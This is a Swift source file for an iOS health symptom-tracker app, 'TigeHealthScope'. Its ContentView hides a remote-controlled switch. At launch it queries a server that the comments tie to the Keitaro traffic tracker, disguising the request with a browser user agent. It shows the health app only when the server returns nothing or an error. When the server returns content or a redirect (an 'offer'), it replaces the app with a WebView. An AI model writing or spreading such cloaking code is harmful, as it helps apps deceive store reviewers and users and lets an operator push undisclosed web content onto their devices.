//
//  ContentView.swift
//  TigeHealthScope
//
//  Created by Simon Bakhanets on 24.01.2026.
//

import SwiftUI
import Foundation

struct ContentView: View {
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @State var isFetched: Bool = false
    @AppStorage("isBlock") var isBlock: Bool = true
    
    var body: some View {
        ZStack {
            if isFetched == false {
                // Показываем загрузку пока проверяем сервер
                ZStack {
                    LinearGradient(
                        gradient: Gradient(colors: [Color.primaryBackground, Color.secondaryBackground]),
                        startPoint: .topLeading,
                        endPoint: .bottomTrailing
                    )
                    .ignoresSafeArea()
                    
                    ProgressView()
                        .progressViewStyle(CircularProgressViewStyle(tint: .white))
                        .scaleEffect(1.5)
                }
                
            } else if isFetched == true {
                
                if isBlock == true {
                    // Показываем обычное приложение TigeHealth Scope
                    TigeHealthScopeAppContent(hasCompletedOnboarding: $hasCompletedOnboarding)
                    
                } else if isBlock == false {
                    // Показываем WebView
                    WebSystem()
                }
            }
        }
        .onAppear {
            makeServerRequest()
        }
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = true
            self.isFetched = true
            return
        }
        
        print("🚀 Making request to: \(url.absoluteString)")
        print("🏠 Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Добавляем заголовки для имитации браузера
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        
        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
        
        // Создаем URLSession без автоматических редиректов
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("❌ Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing TigeHealth Scope app")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
                    
                    // Логируем тело ответа для диагностики
                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
                    }
                    
                    if httpResponse.statusCode == 200 {
                        // Проверяем, есть ли контент в ответе
                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
                        let hasContent = data?.count ?? 0 > 0
                        
                        if contentLength == "0" || !hasContent {
                            // Пустой ответ = "do nothing" от Keitaro
                            print("🚫 Empty response (do nothing): Showing TigeHealth Scope app")
                            self.isBlock = true
                            self.isFetched = true
                        } else {
                            // Есть контент = успех
                            print("✅ Success with content: Showing WebView")
                            self.isBlock = false
                            self.isFetched = true
                        }
                        
                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
                        // Редиректы = успех (есть оффер)
                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // 404, 403, 500 и т.д. - блокируем
                        print("🚫 Error code \(httpResponse.statusCode): Showing TigeHealth Scope app")
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    print("❌ No HTTP response: Showing TigeHealth Scope app")
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

// Отдельный компонент для основного приложения
struct TigeHealthScopeAppContent: View {
    @Binding var hasCompletedOnboarding: Bool
    
    var body: some View {
        if hasCompletedOnboarding {
            MainTabView()
        } else {
            OnboardingView(hasCompletedOnboarding: $hasCompletedOnboarding)
        }
    }
}

struct MainTabView: View {
    @State private var selectedTab = 0
    
    var body: some View {
        ZStack(alignment: .bottom) {
            // Tab Content
            Group {
                switch selectedTab {
                case 0:
                    SymptomTrackerView()
                case 1:
                    HealthInsightsView()
                case 2:
                    SettingsView()
                default:
                    SymptomTrackerView()
                }
            }
            
            // Custom Tab Bar
            CustomTabBar(selectedTab: $selectedTab)
        }
        .ignoresSafeArea(.keyboard)
    }
}

struct CustomTabBar: View {
    @Binding var selectedTab: Int
    
    var body: some View {
        HStack(spacing: 0) {
            TabBarButton(
                icon: "list.clipboard.fill",
                title: "Tracker",
                isSelected: selectedTab == 0
            ) {
                selectedTab = 0
            }
            
            TabBarButton(
                icon: "chart.bar.fill",
                title: "Insights",
                isSelected: selectedTab == 1
            ) {
                selectedTab = 1
            }
            
            TabBarButton(
                icon: "gearshape.fill",
                title: "Settings",
                isSelected: selectedTab == 2
            ) {
                selectedTab = 2
            }
        }
        .padding(.horizontal, 16)
        .padding(.vertical, 12)
        .background(
            Color.primaryBackground.opacity(0.95)
                .overlay(
                    Rectangle()
                        .fill(Color.white.opacity(0.1))
                        .frame(height: 1),
                    alignment: .top
                )
        )
        .ignoresSafeArea(.keyboard)
    }
}

struct TabBarButton: View {
    let icon: String
    let title: String
    let isSelected: Bool
    let action: () -> Void
    
    var body: some View {
        Button(action: action) {
            VStack(spacing: 4) {
                Image(systemName: icon)
                    .font(.system(size: 22))
                    .foregroundColor(isSelected ? .primaryButton : .textSecondary)
                
                Text(title)
                    .font(.system(size: 11, weight: .medium))
                    .foregroundColor(isSelected ? .primaryButton : .textSecondary)
            }
            .frame(maxWidth: .infinity)
        }
    }
}

#Preview {
    ContentView()
}
